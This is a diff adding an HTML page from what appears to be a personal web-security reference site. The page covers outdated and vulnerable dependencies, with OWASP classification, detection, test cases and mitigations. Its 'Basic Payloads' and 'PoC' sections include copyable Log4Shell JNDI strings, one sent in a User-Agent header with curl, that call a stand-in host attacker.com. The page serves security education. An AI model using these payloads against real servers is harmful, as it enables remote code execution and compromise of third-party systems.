@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Outdated Libraries | Web Security | Saikumar Raju</title>
+  <!-- same style and navbar -->
+</head>
+<body>
+<nav>...</nav>
+<main>
+  <div class="container">
+    <div class="breadcrumb">...</div>
+    <div class="page-header">
+      <span class="severity-badge">High Severity</span>
+      <h1>📌 Outdated Libraries & Dependencies</h1>
+    </div>
+    <div class="content-section">
+      <h2>🧠 Description</h2>
+      <p><strong>What is the vulnerability?</strong></p>
+      <p>Client‑side or server‑side libraries (jQuery, React, Angular, Log4j, OpenSSL) have known CVEs that are not patched. Attackers can exploit these vulnerabilities to compromise the application.</p>
+      <p><strong>Why does it occur?</strong></p>
+      <p>Lack of dependency scanning, no update policy, or fear of breaking changes.</p>
+      <p><strong>Real-world analogy:</strong> Using a 10‑year‑old antivirus signature – it won't detect new threats.</p>
+    </div>
+    <div class="content-section">
+      <h2>🏷️ Classification</h2>
+      <ul><li><strong>Type:</strong> Vulnerable Components</li><li><strong>OWASP:</strong> A06:2021 – Vulnerable and Outdated Components</li><li><strong>CWE:</strong> CWE-1104: Use of Unmaintained Third Party Components</li></ul>
+    </div>
+    <div class="content-section">
+      <h2>🎯 Attack Surface</h2>
+      <ul><li>✅ JavaScript libraries with known XSS/RCE (e.g., older jQuery, AngularJS sandbox escapes)</li><li>✅ Server‑side libraries (Log4Shell, Struts2, Spring4Shell)</li><li>✅ PHP libraries (Composer dependencies with CVEs)</li></ul>
+    </div>
+    <div class="content-section">
+      <h2>🔍 Detection Methodology</h2>
+      <ul><li>Check <code>package.json</code>, <code>composer.lock</code>, <code>pom.xml</code> if accessible.</li><li>Use browser devtools to view loaded library versions.</li><li>Run <code>npm audit</code>, <code>safety check</code>, or OWASP Dependency‑Check.</li></ul>
+    </div>
+    <div class="content-section">
+      <h2>💣 Basic Payloads (Example: Log4Shell)</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button><pre>${jndi:ldap://attacker.com/exploit}</pre></div>
+    </div>
+    <div class="content-section">
+      <h2>🚀 Advanced Exploitation</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button><pre># Use nuclei to scan for known vulnerable versions
+nuclei -t technologies/ -target https://target.com</pre></div>
+    </div>
+    <div class="content-section">
+      <h2>🧪 Test Cases</h2>
+      <table class="test-cases"><thead><tr><th>Step</th><th>Action</th><th>Expected</th><th>Actual</th></tr></thead><tbody><tr><td>1</td><td>Identify library versions via version endpoint or file hashes</td><td>No version exposed or latest</td><td>Version 1.2.3 with known CVE</td></tr><tr><td>2</td><td>Attempt known exploit for that version</td><td>Attack fails</td><td>Exploit succeeds</td></tr></tbody></table>
+    </div>
+    <div class="content-section">
+      <h2>⚙️ Exploitation Steps</h2>
+      <ol><li>Detect outdated library version.</li><li>Search for public exploit (Exploit‑DB, CVE details).</li><li>Execute exploit to gain RCE or data leakage.</li></ol>
+    </div>
+    <div class="content-section">
+      <h2>🛡️ Mitigation</h2>
+      <div class="mitigation-box"><strong>✅ Regularly update dependencies (use Dependabot, Renovate).</strong><br>✅ Use software composition analysis (SCA) tools.<br>✅ Remove unused libraries.<br>✅ Subscribe to security advisories for frameworks used.</div>
+    </div>
+    <div class="content-section">
+      <h2>🔓 Mitigation Bypass</h2>
+      <ul><li>If patched but still vulnerable due to backported fix not fully addressing the issue.</li></ul>
+    </div>
+    <div class="content-section">
+      <h2>⚠️ Risk / Impact</h2>
+      <div class="vulnerability-box"><strong>Severity: High to Critical</strong><br><br><strong>Impact:</strong> RCE, data breach, XSS, SSRF depending on the component.</div>
+    </div>
+    <div class="content-section">
+      <h2>📎 PoC</h2>
+      <div class="code-block"><button class="copy-btn" onclick="copyCode(this)">Copy</button><pre>curl https://target.com -H "User-Agent: ${jndi:ldap://attacker.com/a}"</pre></div>
+    </div>
+    <div class="content-section">
+      <h2>📚 References</h2>
+      <ul><li><a href="https://owasp.org/www-project-top-ten/2021/A06_2021-Vulnerable_and_Outdated_Components" style="color: var(--primary);">OWASP A06:2021</a></li></ul>
+    </div>
+    <a href="index.html" class="back-link">← Back</a>
+  </div>
+</main>
+<footer>...</footer>
+<script>/* same */</script>
+</body>
+</html>
